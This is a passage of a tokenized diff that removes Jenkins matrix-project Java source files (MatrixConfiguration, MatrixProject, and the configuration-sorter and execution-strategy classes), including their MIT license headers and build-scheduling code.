"getBuildDiscarder", "(", ")", "{", "/", "/", "TODO", ":", "LinkedLogRotator", "doesn", "'", "t", "work", "very", "well", "in", "the", "face", "of", "pluggable", "BuildDiscarder", "but", "I", "don", "'", "t", "know", "what", "to", "do", "BuildDiscarder", "bd", "=", "getParent", "(", ").", "getBuildDiscarder", "(", ");", "if", "(", "bd", "instanceof", "LogRotator", ")", "{", "LogRotator", "lr", "=", "(", "LogRotator", ")", "bd", ";", "return", "new", "LinkedLogRotator", "(", "lr", ".", "getArtifactDaysToKeep", "(", "),", "lr", ".", "getArtifactNumToKeep", "(", "))", ";", "}", "return", "new", "LinkedLogRotator", "(", ");", "}", "@", "Override", "public", "SCM", "getScm", "(", ")", "{", "return", "getParent", "(", ").", "getScm", "(", ");", "}", "/", "*", "package", "*", "/", "String", "getDigestName", "(", ")", "{", "return", "digestName", ";", "}", "/", "**", "*", "JDK", "cannot", "be", "set", "on", "{", "@", "link", "MatrixConfiguration", "}", "because", "*", "it", "'", "s", "controlled", "by", "{", "@", "link", "MatrixProject", "}", ".", "*", "@", "deprecated", "*", "Not", "supported", ".", "*", "/", "@", "Override", "public", "void", "setJDK", "(", "JDK", "jdk", ")", "throws", "IOException", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "/", "**", "*", "@", "deprecated", "*", "Value", "is", "controlled", "by", "{", "@", "link", "MatrixProject", "}", ".", "*", "/", "@", "Override", "public", "void", "setBuildDiscarder", "(", "BuildDiscarder", "logRotator", ")", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "/", "**", "*", "Returns", "true", "if", "this", "configuration", "is", "a", "configuration", "*", "currently", "in", "use", "today", "(", "as", "opposed", "to", "the", "ones", "that", "are", "*", "there", "only", "to", "keep", "the", "past", "record", ".", ")", "*", "*", "@", "see", "MatrixProject", "#", "getActiveConfigurations", "(", ")", "*", "/", "public", "boolean", "isActiveConfiguration", "(", ")", "{", "return", "getParent", "(", ").", "getActiveConfigurations", "(", ").", "contains", "(", "this", ")", ";", "}", "/", "**", "*", "On", "Cygwin", ",", "path", "names", "cannot", "be", "longer", "than", "256", "chars", ".", "*", "See", "http", ":", "//", "cygwin", ".", "com", "/", "ml", "/", "cygwin", "/", "2005", "-", "04", "/", "msg00395", ".", "html", "and", "*", "http", ":", "//", "www", ".", "nabble", ".", "com", "/", "Windows", "-", "Filename", "-", "too", "-", "long", "-", "errors", "-", "t3161089", ".", "html", "for", "*", "the", "background", "of", "this", "issue", ".", "Setting", "this", "flag", "to", "true", "would", "*", "cause", "Jenkins", "to", "use", "cryptic", "but", "short", "path", "name", ",", "giving", "more", "room", "for", "*", "jobs", "to", "use", "longer", "path", "names", ".", "*", "/", "public", "static", "boolean", "useShortWorkspaceName", "=", "Boolean", ".", "getBoolean", "(", "MatrixConfiguration", ".", "class", ".", "getName", "(", ")+", "\".", "useShortWorkspaceName", "\"", ");", "/", "**", "*", "@", "deprecated", "*", "Use", "{", "@", "link", "#", "scheduleBuild", "(", "ParametersAction", ",", "Cause", ")", "}.", "Since", "1", ".", "283", "*", "/", "public", "boolean", "scheduleBuild", "(", "ParametersAction", "parameters", ")", "{", "return", "scheduleBuild", "(", "parameters", ",", "new", "LegacyCodeCause", "(", "))", ";", "}", "/", "**", "Starts", "the", "build", "with", "the", "ParametersAction", "that", "are", "passed", "in", ".", "*", "*", "@", "param", "parameters", "*", "Can", "be", "null", ".", "*", "@", "deprecated", "*", "Use", "{", "@", "link", "#", "scheduleBuild", "(", "List", ",", "Cause", ")", "}.", "Since", "1", ".", "480", "*", "/", "public", "boolean", "scheduleBuild", "(", "ParametersAction", "parameters", ",", "Cause", "c", ")", "{", "return", "scheduleBuild", "(", "Collections", ".", "singletonList", "(", "parameters", ")", ",", "c", ")", ";", "}", "/", "**", "*", "Starts", "the", "build", "with", "the", "actions", "that", "are", "passed", "in", ".", "*", "*", "@", "param", "actions", "Can", "be", "null", ".", "*", "@", "param", "c", "Reason", "for", "starting", "the", "build", "*", "/", "public", "boolean", "scheduleBuild", "(", "List", "<", "?", "extends", "Action", ">", "actions", ",", "Cause", "c", ")", "{", "List", "<", "Action", ">", "allActions", "=", "new", "ArrayList", "<", "Action", ">", "()", ";", "if", "(", "actions", "!", "=", "null", ")", "allActions", ".", "addAll", "(", "actions", ")", ";", "allActions", ".", "add", "(", "new", "ParentBuildAction", "(", "))", ";", "allActions", ".", "add", "(", "new", "CauseAction", "(", "c", ")", ");", "return", "Jenkins", ".", "getInstance", "(", ").", "getQueue", "(", ").", "schedule2", "(", "this", ",", "getQuietPeriod", "(", "),", "allActions", ")", ".", "isAccepted", "(", ");", "}", "/", "**", "*", "*", "/", "public", "static", "class", "ParentBuildAction", "extends", "InvisibleAction", "implements", "QueueAction", "{", "public", "transient", "MatrixBuild", "parent", "=", "(", "MatrixBuild", ")", "Executor", ".", "currentExecutor", "(", ").", "getCurrentExecutable", "(", ");", "public", "boolean", "shouldSchedule", "(", "List", "<", "Action", ">", "actions", ")", "{", "return", "true", ";", "}", "}", "}", "@", "@", "-", "1", ",", "36", "+", "0", ",", "0", "@", "@", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "ExtensionPoint", ";", "import", "hudson", ".", "model", ".", "AbstractDescribableImpl", ";", "import", "hudson", ".", "util", ".", "FormValidation", ";", "import", "java", ".", "util", ".", "Comparator", ";", "/", "**", "*", "Add", "sorting", "for", "configurations", "{", "@", "link", "MatrixConfiguration", "}", "s", "of", "matrix", "job", "{", "@", "link", "MatrixProject", "}", "*", "*", "@", "since", "1", ".", "439", "*", "@", "author", "Lucie", "Votypkova", "*", "@", "see", "MatrixConfigurationSorterDescriptor", "*", "/", "public", "abstract", "class", "MatrixConfigurationSorter", "extends", "AbstractDescribableImpl", "<", "MatrixConfigurationSorter", ">", "implements", "ExtensionPoint", ",", "Comparator", "<", "MatrixConfiguration", ">", "{", "/", "**", "*", "Checks", "if", "this", "sorter", "is", "properly", "configured", "and", "applicable", "for", "the", "given", "project", ".", "*", "*", "<", "p", ">", "*", "This", "method", "is", "invoked", "when", "the", "configuration", "is", "submitted", "to", "ensure", "that", "the", "sorter", "is", "compatible", "*", "with", "the", "current", "project", "configuration", "(", "most", "probably", "with", "its", "{", "@", "link", "Axis", "}", ".)", "*", "*", "@", "param", "p", "*", "Project", "for", "which", "this", "sorter", "is", "being", "used", "for", ".", "*", "@", "throws", "FormValidation", "*", "If", "you", "need", "to", "report", "an", "error", "to", "the", "user", "and", "reject", "the", "form", "submission", ".", "*", "/", "public", "abstract", "void", "validate", "(", "MatrixProject", "p", ")", "throws", "FormValidation", ";", "@", "Override", "public", "MatrixConfigurationSorterDescriptor", "getDescriptor", "(", ")", "{", "return", "(", "MatrixConfigurationSorterDescriptor", ")", "super", ".", "getDescriptor", "(", ");", "}", "}", "@", "@", "-", "1", ",", "27", "+", "0", ",", "0", "@", "@", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "DescriptorExtensionList", ";", "import", "hudson", ".", "model", ".", "Descriptor", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "/", "**", "*", "Descriptor", "for", "{", "@", "link", "MatrixConfigurationSorter", "}", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "@", "since", "1", ".", "439", "*", "/", "public", "abstract", "class", "MatrixConfigurationSorterDescriptor", "extends", "Descriptor", "<", "MatrixConfigurationSorter", ">", "{", "protected", "MatrixConfigurationSorterDescriptor", "(", "Class", "<", "?", "extends", "MatrixConfigurationSorter", ">", "clazz", ")", "{", "super", "(", "clazz", ")", ";", "}", "protected", "MatrixConfigurationSorterDescriptor", "(", ")", "{", "}", "/", "**", "*", "Returns", "all", "the", "registered", "{", "@", "link", "MatrixConfigurationSorterDescriptor", "}", "s", ".", "*", "/", "public", "static", "DescriptorExtensionList", "<", "MatrixConfigurationSorter", ",", "MatrixConfigurationSorterDescriptor", ">", "all", "(", ")", "{", "return", "Jenkins", ".", "getInstance", "(", ").", "<", "MatrixConfigurationSorter", ",", "MatrixConfigurationSorterDescriptor", ">", "getDescriptorList", "(", "MatrixConfigurationSorter", ".", "class", ")", ";", "}", "}", "@", "@", "-", "1", ",", "60", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2012", ",", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "ExtensionPoint", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ".", "MatrixBuildExecution", ";", "import", "hudson", ".", "model", ".", "AbstractDescribableImpl", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "import", "hudson", ".", "model", ".", "Result", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "List", ";", "/", "**", "*", "Controls", "the", "execution", "sequence", "of", "{", "@", "link", "MatrixConfiguration", "}", "when", "{", "@", "link", "MatrixProject", "}", "builds", ",", "*", "including", "what", "degree", "it", "gets", "serialized", "/", "parallelled", ",", "how", "the", "whole", "build", "is", "abandoned", "when", "*", "some", "fails", ",", "etc", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "@", "since", "1", ".", "456", "*", "/", "public", "abstract", "class", "MatrixExecutionStrategy", "extends", "AbstractDescribableImpl", "<", "MatrixExecutionStrategy", ">", "implements", "ExtensionPoint", "{", "public", "Result", "run", "(", "MatrixBuildExecution", "execution", ")", "throws", "InterruptedException", ",", "IOException", "{", "return", "run", "(", "execution", ".", "getBuild", "(", "),", "execution", ".", "getAggregators", "(", "),", "execution", ".", "getListener", "(", "))", ";", "}", "/", "**", "*", "@", "deprecated", "*", "Override", "{", "@", "link", "#", "run", "(", "MatrixBuild", ".", "MatrixBuildExecution", ")", "}", "*", "/", "public", "Result", "run", "(", "MatrixBuild", "build", ",", "List", "<", "MatrixAggregator", ">", "aggregators", ",", "BuildListener", "listener", ")", "throws", "InterruptedException", ",", "IOException", "{", "throw", "new", "UnsupportedOperationException", "(", "getClass", "(", ")+", "\"", "needs", "to", "override", "run", "(", "MatrixBuildExecution", ")", "\")", ";", "}", "@", "Override", "public", "MatrixExecutionStrategyDescriptor", "getDescriptor", "(", ")", "{", "return", "(", "MatrixExecutionStrategyDescriptor", ")", "super", ".", "getDescriptor", "(", ");", "}", "}", "@", "@", "-", "1", ",", "48", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2012", ",", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "DescriptorExtensionList", ";", "import", "hudson", ".", "model", ".", "Descriptor", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "/", "**", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "@", "since", "1", ".", "456", "*", "/", "public", "abstract", "class", "MatrixExecutionStrategyDescriptor", "extends", "Descriptor", "<", "MatrixExecutionStrategy", ">", "{", "protected", "MatrixExecutionStrategyDescriptor", "(", "Class", "<", "?", "extends", "MatrixExecutionStrategy", ">", "clazz", ")", "{", "super", "(", "clazz", ")", ";", "}", "protected", "MatrixExecutionStrategyDescriptor", "(", ")", "{", "}", "/", "**", "*", "Returns", "all", "the", "registered", "{", "@", "link", "MatrixExecutionStrategyDescriptor", "}", "s", ".", "*", "/", "public", "static", "DescriptorExtensionList", "<", "MatrixExecutionStrategy", ",", "MatrixExecutionStrategyDescriptor", ">", "all", "(", ")", "{", "return", "Jenkins", ".", "getInstance", "(", ").", "<", "MatrixExecutionStrategy", ",", "MatrixExecutionStrategyDescriptor", ">", "getDescriptorList", "(", "MatrixExecutionStrategy", ".", "class", ")", ";", "}", "}", "@", "@", "-", "1", ",", "951", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2011", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "*", "Jorg", "Heymans", ",", "Red", "Hat", ",", "Inc", ".", ",", "id", ":", "cactusman", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "com", ".", "google", ".", "common", ".", "base", ".", "Function", ";", "import", "com", ".", "google", ".", "common", ".", "collect", ".", "Iterables", ";", "import", "com", ".", "google", ".", "common", ".", "collect", ".", "Lists", ";", "import", "com", ".", "google", ".", "common", ".", "collect", ".", "Sets", ";", "import", "hudson", ".", "CopyOnWrite", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "Util", ";", "import", "hudson", ".", "XmlFile", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ".", "MatrixBuildExecution", ";", "import", "hudson", ".", "model", ".", "AbstractProject", ";", "import", "hudson", ".", "model", ".", "Action", ";", "import", "hudson", ".", "model", ".", "BuildableItemWithBuildWrappers", ";", "import", "hudson", ".", "model", ".", "DependencyGraph", ";", "import", "hudson", ".", "model", ".", "Descriptor", ";", "import", "hudson", ".", "model", ".", "Descriptor", ".", "FormException", ";", "import", "hudson", ".", "model", ".", "Node", ";", "import", "hudson", ".", "slaves", ".", "WorkspaceList", ";", "import", "hudson", ".", "util", ".", "AlternativeUiTextProvider", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "hudson", ".", "model", ".", "Item", ";", "import", "hudson", ".", "model", ".", "ItemGroup", ";", "import", "hudson", ".", "model", ".", "Items", ";", "import", "hudson", ".", "model", ".", "JDK", ";", "import", "hudson", ".", "model", ".", "Job", ";", "import", "hudson", ".", "model", ".", "Label", ";", "import", "hudson", ".", "model", ".", "ParameterDefinition", ";", "import", "hudson", ".", "model", ".", "ParametersDefinitionProperty", ";", "import", "hudson", ".", "model", ".", "Queue", ".", "FlyweightTask", ";", "import", "hudson", ".", "model", ".", "Result", ";", "import", "hudson", ".", "model", ".", "SCMedItem", ";", "import", "hudson", ".", "model", ".", "Saveable", ";", "import", "hudson", ".", "model", ".", "TopLevelItem", ";", "import", "hudson", ".", "tasks", ".", "BuildStep", ";", "import", "hudson", ".", "tasks", ".", "BuildWrapper", ";", "import", "hudson", ".", "tasks", ".", "BuildWrappers", ";", "import", "hudson", ".", "tasks", ".", "Builder", ";", "import", "hudson", ".", "tasks", ".", "Publisher", ";", "import", "hudson", ".", "triggers", ".", "Trigger", ";", "import", "hudson", ".", "util", ".", "CopyOnWriteMap", ";", "import", "hudson", ".", "util", ".", "DescribableList", ";", "import", "hudson", ".", "util", ".", "FormValidation", ";", "import", "hudson", ".", "util", ".", "FormValidation", ".", "Kind", ";", "import", "jenkins", ".", "scm", ".", "SCMCheckoutStrategyDescriptor", ";", "import", "net", ".", "sf", ".", "json", ".", "JSONObject", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "Restricted", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "restrictions", ".", "NoExternalUse", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "HttpResponse", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerResponse", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "TokenList", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "export", ".", "Exported", ";", "import", "javax", ".", "annotation", ".", "Nullable", ";", "import", "javax", ".", "servlet", ".", "ServletException", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "FileFilter", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "LinkedHashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Map", ".", "Entry", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "java", ".", "util", ".", "logging", ".", "Level", ";", "import", "java", ".", "util", ".", "logging", ".", "Logger", ";", "import", "java", ".", "util", ".", "regex", ".", "Matcher", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "/", "**", "*", "{", "@", "link", "Job", "}", "that", "allows", "you", "to", "run", "multiple", "different", "configurations", "*", "from", "a", "single", "setting", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "MatrixProject", "extends", "AbstractProject", "<", "MatrixProject", ",", "MatrixBuild", ">", "implements", "TopLevelItem", ",", "SCMedItem", ",", "ItemGroup", "<", "MatrixConfiguration", ">", ",", "Saveable", ",", "FlyweightTask", ",", "BuildableItemWithBuildWrappers", "{", "/", "**", "*", "Configuration", "axes", ".", "*", "/", "private", "volatile", "AxisList", "axes", "=", "new", "AxisList", "(", ");", "/", "**", "*", "The", "filter", "that", "is", "applied", "to", "combinations", ".", "It", "is", "a", "Groovy", "if", "condition", ".", "*", "This", "can", "be", "null", ",", "which", "means", "\"", "true", "\"", ".", "*", "*", "@", "see", "#", "getCombinationFilter", "(", ")", "*", "/", "private", "volatile", "String", "combinationFilter", ";", "/", "**", "*", "List", "of", "active", "{", "@", "link", "Builder", "}", "s", "configured", "for", "this", "project", ".", "*", "/", "private", "DescribableList", "<", "Builder", ",", "Descriptor", "<", "Builder", ">", ">", "builders", "=", "new", "DescribableList", "<", "Builder", ",", "Descriptor", "<", "Builder", ">", ">(", "this", ")", ";", "/", "**", "*", "List", "of", "active", "{", "@", "link", "Publisher", "}", "s", "configured", "for", "this", "project", ".", "*", "/", "private", "DescribableList", "<", "Publisher", ",", "Descriptor", "<", "Publisher", ">", ">", "publishers", "=", "new", "DescribableList", "<", "Publisher", ",", "Descriptor", "<", "Publisher", ">", ">(", "this", ")", ";", "/", "**", "*", "List", "of", "active", "{", "@", "link", "BuildWrapper", "}", "s", "configured", "for", "this", "project", ".", "*", "/", "private", "DescribableList", "<", "BuildWrapper", ",", "Descriptor", "<", "BuildWrapper", ">", ">", "buildWrappers", "=", "new", "DescribableList", "<", "BuildWrapper", ",", "Descriptor", "<", "BuildWrapper", ">", ">(", "this", ")", ";", "/", "**", "*", "All", "{", "@", "link", "MatrixConfiguration", "}", "s", ",", "keyed", "by", "their", "{", "@", "link", "MatrixConfiguration", "#", "getName", "(", ")", "names", "}", ".", "*", "/", "private", "transient", "/", "*", "final", "*", "/", "Map", "<", "Combination", ",", "MatrixConfiguration", ">", "configurations", "=", "new", "CopyOnWriteMap", ".", "Tree", "<", "Combination", ",", "MatrixConfiguration", ">", "()", ";", "/", "**", "*", "@", "see", "#", "getActiveConfigurations", "(", ")", "*", "/", "@", "CopyOnWrite", "private", "transient", "/", "*", "final", "*", "/", "Set", "<", "MatrixConfiguration", ">", "activeConfigurations", "=", "new", "LinkedHashSet", "<", "MatrixConfiguration", ">", "()", ";", "/", "**", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Moved", "to", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "}", "*", "/", "private", "transient", "Boolean", "runSequentially", ";", "/", "**", "*", "Filter", "to", "select", "a", "number", "of", "combinations", "to", "build", "first", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Moved", "to", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "}", "*", "/", "private", "transient", "String", "touchStoneCombinationFilter", ";", "/", "**", "*", "Required", "result", "on", "the", "touchstone", "combinations", ",", "in", "order", "to", "*", "continue", "with", "the", "rest", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Moved", "to", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "}", "*", "/", "private", "transient", "Result", "touchStoneResultCondition", ";", "/", "**", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Moved", "to", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "}", "*", "/", "private", "transient", "MatrixConfigurationSorter", "sorter", ";", "private", "MatrixExecutionStrategy", "executionStrategy", ";", "/", "**", "*", "Custom", "workspace", "location", "for", "{", "@", "link", "MatrixConfiguration", "}", "s", ".", "*", "*", "<", "p", ">", "*", "(", "Historically", ",", "we", "used", "{", "@", "link", "AbstractProject", "#", "customWorkspace", "}", "+", "some", "unique", "suffix", "(", "see", "{", "@", "link", "MatrixConfiguration", "#", "useShortWorkspaceName", "}", ")", "*", "for", "custom", "workspace", ",", "but", "we", "now", "separated", "that", "so", "that", "the", "user", "has", "more", "control", ".", "*", "*", "<", "p", ">", "*", "If", "null", ",", "the", "historical", "semantics", "is", "assumed", ".", "*", "*", "@", "since", "1", ".", "466", "*", "/", "private", "String", "childCustomWorkspace", ";", "public", "MatrixProject", "(", "String", "name", ")", "{", "this", "(", "Jenkins", ".", "getInstance", "(", "),", "name", ")", ";", "}", "public", "MatrixProject", "(", "ItemGroup", "parent", ",", "String", "name", ")", "{", "super", "(", "parent", ",", "name", ")", ";", "}", "@", "Override", "public", "String", "getPronoun", "(", ")", "{", "return", "AlternativeUiTextProvider", ".", "get", "(", "PRONOUN", ",", "this", ",", "Messages", ".", "MatrixProject_Pronoun", "(", "))", ";", "}", "/", "**", "*", "Gets", "the", "workspace", "location", "that", "{", "@", "link", "MatrixConfiguration", "}", "uses", ".", "*", "*", "@", "see", "MatrixRun", ".", "MatrixRunExecution", "#", "decideWorkspace", "(", "Node", ",", "WorkspaceList", ")", "*", "*", "@", "return", "never", "null", "*", "even", "when", "{", "@", "link", "MatrixProject", "}", "uses", "no", "custom", "workspace", ",", "this", "method", "still", "*", "returns", "something", "like", "\"", "${", "PARENT_WORKSPACE", "}", "/$", "{", "COMBINATION", "}", "\"", "that", "controls", "*", "how", "the", "workspace", "should", "be", "laid", "out", ".", "*", "*", "The", "return", "value", "can", "be", "absolute", "or", "relative", ".", "If", "relative", ",", "it", "is", "resolved", "*", "against", "the", "working", "directory", "of", "the", "overarching", "{", "@", "link", "MatrixBuild", "}", ".", "*", "/", "public", "String", "getChildCustomWorkspace", "(", ")", "{", "String", "ws", "=", "childCustomWorkspace", ";", "if", "(", "ws", "=", "=", "null", ")", "{", "ws", "=", "MatrixConfiguration", ".", "useShortWorkspaceName", "?", "\"$", "{", "SHORT_COMBINATION", "}", "\":", "\"$", "{", "COMBINATION", "}", "\";", "}", "return", "ws", ";", "}", "/", "**", "*", "Do", "we", "have", "an", "explicit", "child", "custom", "workspace", "setting", "(", "true", ")", "?", "Or", "just", "using", "the", "default", "value", "(", "false", ")", "?", "*", "/", "public", "boolean", "hasChildCustomWorkspace", "(", ")", "{", "return", "childCustomWorkspace", "!", "=", "null", ";", "}", "public", "void", "setChildCustomWorkspace", "(", "String", "childCustomWorkspace", ")", "throws", "IOException", "{", "this", ".", "childCustomWorkspace", "=", "Util", ".", "fixEmptyAndTrim", "(", "childCustomWorkspace", ")", ";", "save", "(", ");", "}", "/", "**", "*", "{", "@", "link", "MatrixProject", "}", "is", "relevant", "with", "all", "the", "labels", "its", "configurations", "are", "relevant", ".", "*", "/", "@", "Override", "public", "Set", "<", "Label", ">", "getRelevantLabels", "(", ")", "{", "Set", "<", "Label", ">", "r", "=", "new", "HashSet", "<", "Label", ">", "()", ";", "for", "(", "MatrixConfiguration", "c", ":", "getActiveConfigurations", "(", "))", "r", ".", "add", "(", "c", ".", "getAssignedLabel", "(", "))", ";", "return", "r", ";", "}", "/", "**", "*", "@", "return", "can", "be", "null", "(", "to", "indicate", "that", "the", "configurations", "should", "be", "left", "to", "their", "natural", "order", ".", ")", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Use", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "#", "getSorter", "(", ")}", ".", "*", "This", "method", "tries", "to", "emulate", "the", "previous", "behavior", "the", "best", "it", "can", ",", "but", "will", "return", "null", "*", "if", "the", "current", "{", "@", "link", "MatrixExecutionStrategy", "}", "is", "not", "the", "default", "one", ".", "*", "/", "public", "MatrixConfigurationSorter", "getSorter", "(", ")", "{", "MatrixExecutionStrategy", "e", "=", "executionStrategy", ";", "if", "(", "e", "instanceof", "DefaultMatrixExecutionStrategyImpl", ")", "{", "DefaultMatrixExecutionStrategyImpl", "dm", "=", "(", "DefaultMatrixExecutionStrategyImpl", ")", "e", ";", "return", "dm", ".", "getSorter", "(", ");", 